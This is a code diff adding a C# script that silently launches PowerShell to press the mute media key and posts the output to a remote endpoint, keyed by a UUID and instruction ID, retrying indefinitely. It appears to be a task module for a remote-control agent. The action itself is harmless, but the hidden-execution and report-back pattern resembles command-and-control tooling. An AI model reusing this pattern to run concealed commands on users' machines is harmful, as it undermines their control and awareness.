@@ -1,0 +1,63 @@
+﻿using System;
+using System.IO;
+using System.Text;
+using System.Net.Http;
+using System.Diagnostics;
+using System.Threading.Tasks;
+using System.Runtime.Serialization;
+using System.Runtime.Serialization.Json;
+public class Script
+{
+    [DataContract]
+    public class Response
+    {
+        [DataMember]
+        public string output { get; set; }
+    }
+    private static async Task NotifyWithRetry(string EndPoint, string uuid, long instructionId, short code, string output)
+    {
+        TimeSpan delay = TimeSpan.FromSeconds(10);
+        while (true)
+        {
+            HttpClient httpClient = new HttpClient();
+            try
+            {
+                DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(Response));
+
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    serializer.WriteObject(ms, new Response { output = output });
+                    var content = new StringContent(Encoding.UTF8.GetString(ms.ToArray()), Encoding.UTF8, "application/json");
+                    var response = await httpClient.PostAsync(EndPoint + "Response/" + uuid + "/" + instructionId + "/" + code, content);
+                    response.EnsureSuccessStatusCode();
+                    break;
+                }
+            }
+            catch (Exception)
+            {
+            }
+            await Task.Delay(delay);
+        }
+    }
+    public static async Task<object> ExecuteAsync(string endpoint, string uuid, long instId, short code)
+    {
+        ProcessStartInfo psi = new ProcessStartInfo
+		{
+			FileName = "powershell.exe",
+			Arguments = "-Command " + "(New-Object -ComObject WScript.Shell).SendKeys([char]173)",
+			RedirectStandardOutput = true,
+			UseShellExecute = false,
+			CreateNoWindow = true
+		};
+		using (Process process = new Process())
+		{
+			process.StartInfo = psi;
+			process.Start();
+			string output = process.StandardOutput.ReadToEnd();
+			process.WaitForExit();
+            await NotifyWithRetry(endpoint, uuid, instId, code, output);
+        }
+        return null;
+    }
+    
+}
